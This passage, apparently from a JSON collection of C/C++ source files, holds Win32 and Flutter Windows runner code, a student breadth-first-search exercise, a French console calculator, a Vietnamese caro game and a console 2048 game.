NULL);\r\n    HWND hwndsSaisieEdit = CreateWindow(L\"EDIT\", L\"<--- Zone de saisie.\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 140, 90, 140, 20, hwndMain, (HMENU)ID_EDIT_SAISIE, NULL, NULL);\r\n    // Passer des champs en lecture seule\r\n    SendMessage(hwndHourEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    SendMessage(hwndMinuteEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    SendMessage(hwndsStopEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    SendMessage(hwndsChoixEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    SendMessage(hwndsSaisieEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    //Formulaire\r\n    CreateWindow(L\"EDIT\", L\"HH \", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 15, 90, 40, 20, hwndMain, (HMENU)ID_EDIT_HOURS, NULL, NULL);\r\n    CreateWindow(L\"EDIT\", L\"MM\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 70, 90, 40, 20, hwndMain, (HMENU)ID_EDIT_MINUTES, NULL, NULL);\r\n    CreateWindow(L\"BUTTON\", L\"Enregistrer!\", WS_VISIBLE | WS_CHILD, 15, 115, 95, 20, hwndMain, (HMENU)ID_EDIT_HOURS_MINUTES_SEND, hInstance, NULL);\r\n    ShowWindow(hwndMain, nCmdShow);\r\n\r\n    //\r\n  \r\n    HICON hIcon = LoadIcon(NULL, IDI_APPLICATION);\r\n    if (hIcon) {\r\n        SendMessage(hwndMain, WM_SETICON, ICON_BIG, (LPARAM)hIcon);\r\n        SendMessage(hwndMain, WM_SETICON, ICON_SMA",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\r\n\r\n#include <dwmapi.h>\r\n#include <flutter_windows.h>\r\n\r\n#include \"resource.h\"\r\n\r\nnamespace {\r\n\r\n/// Window attribute that enables dark mode window decorations.\r\n///\r\n/// Redefined in case the developer's machine has a Windows SDK older than\r\n/// version 10.0.22000.0.\r\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\r\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\r\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\r\n#endif\r\n\r\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\r\n\r\n/// Registry key for app theme preference.\r\n///\r\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\r\n/// value indicates apps should use light mode.\r\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\r\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\r\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\r\n\r\n// The number of Win32Window objects that currently exist.\r\nstatic int g_active_window_count = 0;\r\n\r\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\r\n\r\n// Scale helper to convert logical scaler values to physical using passed in\r\n// scale factor\r\nint Scale(int source, double scale_factor) {\r\n  return static_cast<int>(source * scale_factor);\r\n}\r\n\r\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\r\n// This API is only needed for PerMonitor V1 awareness mode.\r\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\r\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\r\n  if (!user32_module) {\r\n    return;\r\n  }\r\n  auto enable_non_client_dpi_scaling =\r\n      reinterpret_cast<EnableNonClientDpiScaling*>(\r\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\r\n  if (enable_non_client_dpi_scaling != nullptr) {\r\n    enable_non_client_dpi_scaling(hwnd);\r\n  }\r\n  FreeLibrary(user32_module);\r\n}\r\n\r\n}  // namespace\r\n\r\n// Manages the Win32Window's window class registration.\r\nclass WindowClassRegistrar {\r\n public:\r\n  ~WindowClassRegistrar() = default;\r\n\r\n  // Returns the singleton registrar instance.\r\n  static WindowClassRegistrar* GetInstance() {\r\n    if (!instance_) {\r\n      instance_ = new WindowClassRegistrar();\r\n    }\r\n    return instance_;\r\n  }\r\n\r\n  // Returns the name of the window class, registering the class if it hasn't\r\n  // previously been registered.\r\n  const wchar_t* GetWindowClass();\r\n\r\n  // Unregisters the window class. Should only be called if there are no\r\n  // instances of the window.\r\n  void UnregisterWindowClass();\r\n\r\n private:\r\n  WindowClassRegistrar() = default;\r\n\r\n  static WindowClassRegistrar* instance_;\r\n\r\n  bool class_registered_ = false;\r\n};\r\n\r\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\r\n\r\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\r\n  if (!class_registered_) {\r\n    WNDCLASS window_class{};\r\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\r\n    window_class.lpszClassName = kWindowClassName;\r\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\r\n    window_class.cbClsExtra = 0;\r\n    window_class.cbWndExtra = 0;\r\n    window_class.hInstance = GetModuleHandle(nullptr);\r\n    window_class.hIcon =\r\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\r\n    window_class.hbrBackground = 0;\r\n    window_class.lpszMenuName = nullptr;\r\n    window_class.lpfnWndProc = Win32Window::WndProc;\r\n    RegisterClass(&window_class);\r\n    class_registered_ = true;\r\n  }\r\n  return kWindowClassName;\r\n}\r\n\r\nvoid WindowClassRegistrar::UnregisterWindowClass() {\r\n  UnregisterClass(kWindowClassName, nullptr);\r\n  class_registered_ = false;\r\n}\r\n\r\nWin32Window::Win32Window() {\r\n  ++g_active_window_count;\r\n}\r\n\r\nWin32Window::~Win32Window() {\r\n  --g_active_window_count;\r\n  Destroy();\r\n}\r\n\r\nbool Win32Window::Create(const std::wstring& title,\r\n                         const Point& origin,\r\n                         const Size& size) {\r\n  Destroy();\r\n\r\n  const wchar_t* window_class =\r\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\r\n\r\n  const POINT target_point = {static_cast<LONG>(origin.x),\r\n                              static_cast<LONG>(origin.y)};\r\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\r\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\r\n  double scale_factor = dpi / 96.0;\r\n\r\n  HWND window = CreateWindow(\r\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\r\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\r\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\r\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\r\n\r\n  if (!window) {\r\n    return false;\r\n  }\r\n\r\n  UpdateTheme(window);\r\n\r\n  return OnCreate();\r\n}\r\n\r\nbool Win32Window::Show() {\r\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\r\n}\r\n\r\n// static\r\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\r\n                                      UINT const message,\r\n                                      WPARAM const wparam,\r\n              ",
    "//Bobokulov Asilbek 230092 FCS1\n//CS 111 Data Structures and Algorithms\n#include<bits/stdc++.h>\nusing namespace std;\nvoid bfs(vector<vector<int>> &adjList, int startNode, vector<int> &gradeFriend, vector<bool> &visited){\n    queue<int> q; q.push(startNode); gradeFriend[startNode] = 0;\n    while(!q.empty()){\n        int currentNode = q.front();\n        q.pop();\n        for(auto neighbour:adjList[currentNode]){\n            if(!visited[neighbour]){\n                gradeFriend[neighbour] = gradeFriend[currentNode] + 1;\n                visited[neighbour] = 1;\n                q.push(neighbour);\n            }\n        }\n    }\n}\nint main()\n{\n    int n, m; cin >> n >> m;\n    vector<vector<int>> adjList(n);\n    vector<int> gradeFriend(n, -1);\n    vector<bool> visited(n, false);\n    for(int i = 0; i < m; i++){\n        int v1, v2; cin >> v1 >> v2;\n        adjList[v1].push_back(v2);\n        adjList[v2].push_back(v1);\n    }\n    bfs(adjList, 0, gradeFriend, visited); gradeFriend[0] = 0;\n    for(auto x:gradeFriend) cout << x << ' ';\n}\n",
    "#include <iostream>\n#include \"Math.h\"\n\n//indique que l'on a besoin du namespace std\nusing namespace std;\n\nint main() {\n\tcout << \"Hello, World\" << endl;\n\tcout << \"Jacques\\n\";\n\n\t//declare les variables\n\tdouble nombre1 = 0, nombre2 = 0;\n\tdouble resultat = 0;\n\tstring choix = \"\";\n\n\t//affiche le menu\n\tcout << \"* Calculatrice *\" << endl;\n\tcout << \"- Addition : '+'\" << endl;\n\tcout << \"- Soustraction : '-'\" << endl;\n\tcout << \"- Multiplication : '*'\" << endl;\n\tcout << \"- Division : '/'\" << endl;\n\tcout << \"- Quitter : 'q'\" << endl;\n\tcout << \"Choix : \";\n\n\t//recupere ce que l'utilisateur saisie dans choix\n\tcin >> choix;\n\n\t//test si l'operateur correspond bien a +,-,*,/\n\tif (choix != \"+\" && choix != \"-\" && choix != \"*\" && choix != \"/\" && choix != \"q\") {\n\t\tcout << \"l'operateur saisi n'est pas correct !\" << endl;\n\t}\n\telse if (choix == \"q\") {\n\t\texit(1);\n\t}\n\telse {\n\t\t//on demande a l'utilisateur de saisir le nombre1\n\t\tcout << \"Entrez le premier nombre : \" << endl;\n\t\tcin >> nombre1;\n\t\t//on demande a l'utilisateur de saisir le nombre2\n\t\tcout << \"Entrez le deuxieme nombre : \" << endl;\n\t\tcin >> nombre2;\n\t\tif (choix == \"+\") {\n\t\t\tresultat = Addition(nombre1,nombre2);\n\t\t}\n\t\telse if (choix == \"-\") {\n\t\t\tresultat = Soustraction(nombre1, nombre2);\n\t\t}\n\t\telse if (choix == \"*\") {\n\t\t\tresultat = Multiplication(nombre1, nombre2);\n\t\t}\n\t\telse if (choix == \"/\") {\n\t\t\tresultat = Division(nombre1, nombre2);\n\t\t}\n\n\t\t//affiche le resultat\n\t\tcout << \"resultat de \" << nombre1 << \" \" << choix << \" \" << nombre2 << \" = \" << resultat << endl;\n\t}\n\n\treturn 0;\n}",
    "\ufeff#include <iostream>\n#include <string>\n#include <Windows.h>\n#include <iomanip>\n#include <stdio.h>\n#include <conio.h>\n#include <time.h>\n#include <stack>\n#define MAX 100\nusing namespace std;\n\nvoid textcolor(int x) {\n\tHANDLE mau;\n\tmau = GetStdHandle(STD_OUTPUT_HANDLE);\n\tSetConsoleTextAttribute(mau, x);\n}\n\nvoid gotoxy(int x, int y) {\n\tHANDLE hConsoleOutput;\n\tCOORD Cursor_an_Pos = { x - 1, y - 1 };\n\thConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);\n\tSetConsoleCursorPosition(hConsoleOutput, Cursor_an_Pos);\n}\n\nstruct ToaDo\n{\n\tint x, y;\n};\ntypedef struct ToaDo toado;\n\nchar KiemTraHangNgang(char a[MAX][MAX], int n, int vitridong, int vitricot) {\n\tint dem = 1; //T\u00ednh lu\u00f4n qu\u00e2n v\u1eeba \u0111\u00e1nh\n\n\t//X\u00e9t b\u00ean tr\u00e1i tr\u01b0\u1edbc (Ngang tr\u00e1i)\n\tfor (int j = vitricot - 1; j >= 0; --j) {\n\t\tif (a[vitridong][j] == a[vitridong][vitricot]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[vitridong][vitricot];\n\t\t\t}\n\t\t}\n\t\telse //Kh\u00f4ng c\u00f2n t\u00ednh li\u00ean t\u1ee5c => d\u1eebng qu\u00e1 tr\u00ecnh l\u1eb7p \n\t\t{\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t//X\u00e9t qua b\u00ean ph\u1ea3i (ngang ph\u1ea3i)\n\tfor (int j = vitricot + 1; j < n; ++j) {\n\t\tif (a[vitridong][j] == a[vitridong][vitricot]) {\n\t\t\tdem++;\n\t\t}\n\t\tif (dem == 5) {\n\t\t\treturn a[vitridong][vitricot];\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn '.'; // Ch\u01b0a th\u1eafng\n}\n\nchar KiemTraHangDoc(char a[MAX][MAX], int n, int vitridong, int vitricot) {\n\tint dem = 1;\n\tfor (int j = vitridong - 1; j >= 0; --j) {\n\t\tif (a[j][vitricot] == a[vitridong][vitricot]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[vitridong][vitricot];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tfor (int j = vitridong + 1; j < n; ++j) {\n\t\tif (a[j][vitricot] == a[vitridong][vitricot]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[vitridong][vitricot];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn '.';\n}\n\nchar KiemTraHangCheoChinh(char a[MAX][MAX], int n, int m, int x, int y) {\n\tint dem = 1;\n\n\t//Ki\u1ec3m tra ch\u00e9o ch\u00ednh tr\u00ean \n\tint i = x - 1;\n\tint j = y - 1;\n\twhile (true) {\n\t\tif (i < 0 || j < 0) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (a[i][j] == a[x][y]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[x][y];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\n\t\ti--;\n\t\tj--;\n\t}\n\n\ti = x + 1;\n\tj = y + 1;\n\twhile (true) {\n\t\tif (i > n || j > m) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (a[j][i] == a[x][y]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[x][y];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t\ti++;\n\t\tj++;\n\t}\n\n\treturn '.';\n}\n\nchar KiemTraCheoPhu(char a[MAX][MAX], int n, int m, int x, int y) {\n\tint dem = 1;\n\tint i = x - 1;\n\tint j = y + 1;\n\n\twhile (true) {\n\t\tif (i < 0 || j == m) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (a[i][j] == a[x][y]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[x][y];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t\ti--;\n\t\tj++;\n\t}\n\n\ti = x + 1;\n\tj = y - 1;\n\twhile (true) {\n\t\tif (i == n || j < 0) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (a[i][j] == a[x][y]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[x][y];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t\ti++;\n\t\tj--;\n\t}\n\n\treturn '.';\n}\n\nvoid BanCo(int n, int m, int crdong, int cdcot, char c[][MAX]) {\n\t// Ch\u00fa \u00fd nh\u1eefng k\u00fd t\u1ef1 sau \u00e2\u00e2y:\n\t// i = 218 => i- : g\u00f3c tr\u00ean c\u00f9ng b\u00ean tr\u00e1i\n\t// i = 191 => -i : g\u00f3c tr\u00ean c\u00f9ng b\u00ean ph\u1ea3i\n\t// i = 217 => _I : g\u00f3c d\u01b0\u1edbi c\u00f9ng b\u00ean ph\u1ea3i\n\t// i = 192 => |_ : g\u00f3c du\u1edbi c\u00f9ng b\u00ean tr\u00e1i\n\t// i = 196 => _\n\t// i = 179 => |\n\t// i = 194 => T\n\t// i = 193 => T ng\u01b0\u1ee3c\n\t// i = 195 => |-\n\t// i = 180 => -|\n\t// i = 197 => + l\u1edbn\n\n\tint kc = log10(crdong) + 1;\n\tcout << setw(crdong / 2 + 4);\n\t//cout << \"\\t\" << setw(cddong / 2 + 1);\n\tfor (int i = 0; i < m - 1 ; ++i) {\n\t\tcout << i;\n\t\tcout << setw(crdong + 1);\n\t}\n\tcout << m - 1 << endl;\n\n\n\tstring a, b;\n\tfor (int i = 0; i < crdong; ++i) {\n\t\ta += (char)196;\n\t}\n\n\t\n\t//for (int j = 0; j < socot; ++j) {\n\t//\tb = b + (char)179 + \"\\n\" + b;\n\t//}\n\n\tb = (char)179;\n\n\t//H\u00e0ng tr\u00ean\n\tcout << setw(3) << (char)218;\n\tfor (int i = 1; i < m; ++i) {\n\t\tcout << a << (char)194;\n\n\t}\n\tcout << a << (char)191;\n\n\t//H\u00e0ng gi\u1eefa\n\tfor (int i = 1; i < n; ++i) {\n\t\tint size = 3 - log10(i + 1);\n\t\t//Ph\u1ea7n c\u1ed9t\n\t\tfor (int cd = 0; cd < cdcot; ++cd) {\n\t\t\tcout << \"\\n\";\n\t\t\t// Ph\u1ea7n s\u1ed1\n\t\t\tif (cd == cdcot / 2) {\n\t\t\t\tcout << i << setw(size);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << setw(3);\n\t\t\t}\n\t\t\tfor (int j = 0; j < m; ++j) {\n\t\t\t\tcout << b;\n\t\t\t\tfor (int kc = 0; kc < crdong; ++kc) {\n\t\t\t\t\tif (kc != crdong / 2) {\n\t\t\t\t\t\tcout << \" \";\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tif (c[i][j] == 'x' || c[i][j] == 'o') {\n\t\t\t\t\t\t\tc[i][j] == 'x' ? textcolor(13 + 32) : textcolor(14 + 32);\n\t\t\t\t\t\t\tcout << c[i][j];\n\t\t\t\t\t\t\ttextcolor(7);\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\tcout << \" \";\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t}\n\t\t\tcout << b;\n\t\t}\n\n\n\t\tif (i == n - 1) {\n\t\t\tbreak;\n\t\t}\n\n\t\t//Ph\u1ea7n d\u00f2ng\n\t\tcout << \"\\n\" << setw(3) << (char)195;\n\t\tfor (int j = 1; j < m; ++j) {\n\t\t\tcout << a << (char)197;\n\t\t}\n\t\tcout << a << (char)180;\n\t}\n\n\t//H\u00e0ng d\u01b0\u1edbi\n\tcout << \"\\n\" << setw(3) << (char)192;\n\tfor (int i = 1; i < m; ++i) {\n\t\tcout << a << (char)193;\n\t}\n\tcout << a << (char)217;\n}\n\n//=============== \u0110\u00e1nh b\u1eb1ng t\u1ecda \u0111\u1ed9 ==================\n// ==================== C\u00e1ch 1:\nvoid ToaDoCanDanh(int &luotdi, char a[][MAX], int n, int m, int crdong, int cdcot) {\n\tint x, y;\n\tchar quanco;\n\tquanco = luotdi == 0 ? 'x' : 'o';\n\tcout << \"\\nLuot di hien tai cua quan co: \";\n\tif (quanco == 'x') {\n\t\ttextcolor(13);\n\t\tcout << ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"stdio.h\"\r\n#include \"stdlib.h\"\r\n#include \"time.h\"\r\n#include <conio.h>\r\n\r\n#define SIZE 4 // size\r\n#define FINISH 2048 // finish number\r\n#define TABLE_LINE \"+ - - + - - + - - + - - +\\n\"\r\n\r\nvoid draw_table(int (*table)[SIZE])\r\n{\r\n    system(\"cls\") ;\r\n    printf(TABLE_LINE) ;\r\n    for(int i = 0; i < SIZE; i++)\r\n    {\r\n        for(int j = 0; j < SIZE; j++)\r\n        {\r\n            if(table[i][j] == 0) printf(\"|     \") ;\r\n            else printf(\"|%5d\", table[i][j]) ;\r\n        }\r\n        printf(\"|\\n\") ;\r\n        printf(TABLE_LINE) ;\r\n    }\r\n\r\n    printf(\"type arrow to move\\r\") ;\r\n}\r\n\r\nint rand24()\r\n{\r\n    // init random only once\r\n    static int initialized = 0 ;\r\n    if (!initialized) {\r\n        srand((unsigned)time(NULL)) ;\r\n        initialized = 1 ;\r\n    }\r\n\r\n    // return 4 or 2 as 1:7\r\n    return (rand() % 8 == 0) ? 4 : 2 ;\r\n}\r\n\r\nchar input()\r\n{\r\n    int ch ;\r\n    ch = getch() ;\r\n\r\n    switch (ch)\r\n    {\r\n    case 72: return 'U' ; break ; // up\r\n    case 80: return 'D' ; break ; // down\r\n    case 77: return 'R' ; break ; // right\r\n    case 75: return 'L' ; break ; // left\r\n    \r\n    default:\r\n        printf(\"Key Error         \\r\") ;\r\n        return input() ;\r\n    }\r\n}\r\n\r\nvoid creat(int (*table)[SIZE])\r\n{\r\n    int i, j ;\r\n    srand((unsigned)time(NULL)) ;\r\n\r\n    do\r\n    {\r\n        i=(rand())%4 ;\r\n        j=(rand())%4 ;\t\r\n\t}\r\n    while(table[i][j]!=0) ;\r\n\t\r\n    table[i][j]=rand24() ;\r\n}\r\n\r\nvoid move(int (*table)[SIZE])\r\n{\r\n    // get input\r\n\r\n    char enter = input() ;\r\n\r\n    // clone table (to check)\r\n\r\n    int orgtable[SIZE][SIZE] ;\r\n\r\n    for (int i = 0; i < SIZE; i++)\r\n    {\r\n        for (int j = 0; j < SIZE; j++)\r\n        {\r\n            orgtable[i][j] = table[i][j] ;\r\n        }\r\n    }\r\n\r\n    // move\r\n\r\n    switch (enter)\r\n    {\r\n    case 'U':\r\n        for(int i = 0; i < SIZE; i++) // columns\r\n        {\r\n            for(int _ = 0; _ < SIZE-1; _++)\r\n            {\r\n                for(int j = 1; j < SIZE; j++) // rows\r\n                {\r\n                    if(table[j-1][i] == 0) // go to side\r\n                    {\r\n                        table[j-1][i] = table[j][i] ;\r\n                        table[j][i] = 0 ;\r\n                    }\r\n                }\r\n            }\r\n            for(int j = 1; j < SIZE; j++) // rows\r\n            {\r\n                if(table[j-1][i] == table[j][i]) // merge\r\n                {\r\n                    table[j-1][i] = table[j-1][i] + table[j][i] ;\r\n                    table[j][i] = 0 ;\r\n                }\r\n            }\r\n            for(int _ = 0; _ < SIZE-1; _++)\r\n            {\r\n                for(int j = 1; j < SIZE; j++) // rows\r\n                {\r\n                    if(table[j-1][i] == 0) // go to side\r\n                    {\r\n                        table[j-1][i] = table[j][i] ;\r\n                        table[j][i] = 0 ;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        break;\r\n    \r\n    case 'D':\r\n        for(int i = 0; i < SIZE; i++) // columns\r\n        {\r\n            for(int _ = 0; _ < SIZE-1; _++)\r\n            {\r\n                for(int j = SIZE-1; j >= 0; j--) // rows\r\n                {\r\n                    if(table[j+1][i] == 0) // go to side\r\n                    {\r\n                        table[j+1][i] = table[j][i] ;\r\n                        table[j][i] = 0 ;\r\n                    }\r\n                }\r\n            }\r\n            for(int j = SIZE-1; j >= 0; j--) // rows\r\n            {\r\n                if(table[j+1][i] == table[j][i]) // merge\r\n                {\r\n                    table[j+1][i] = table[j+1][i] + table[j][i] ;\r\n                    table[j][i] = 0 ;\r\n                }\r\n            }\r\n            for(int _ = 0; _ < SIZE-1; _++)\r\n            {\r\n                for(int j = SIZE-1; j >= 0; j--) // rows\r\n                {\r\n                    if(table[j+1][i] == 0) // go to side\r\n                    {\r\n                        table[j+1][i] = table[j][i] ;\r\n                        table[j][i] = 0 ;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        break;\r\n    \r\n    case 'R':\r\n        for(int i = 0; i < SIZE; i++) // columns\r\n        {\r\n            for(int _ = 0; _ < SIZE-1; _++)\r\n            {\r\n                for(int j = SIZE-1; j >= 0; j--) // rows\r\n                {\r\n                    if(table[i][j+1] == 0) // go to side\r\n                    {\r\n                        table[i][j+1] = table[i][j] ;\r\n                        table[i][j] = 0 ;\r\n                    }\r\n                }\r\n            }\r\n            for(int j = SIZE-1; j >= 0; j--) // rows\r\n            {\r\n                if(table[i][j+1] == table[i][j]) // merge\r\n                {\r\n                    table[i][j+1] = table[i][j+1] + table[i][j] ;\r\n                    table[i][j] = 0 ;\r\n                }\r\n            }\r\n            for(int _ = 0; _ < SIZE-1; _++)\r\n            {\r\n                for(int j = SIZE-1; j >= 0; j--) // rows\r\n                {\r\n                    if(table[i][j+1] == 0) // go to side\r\n                    {\r\n  ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter 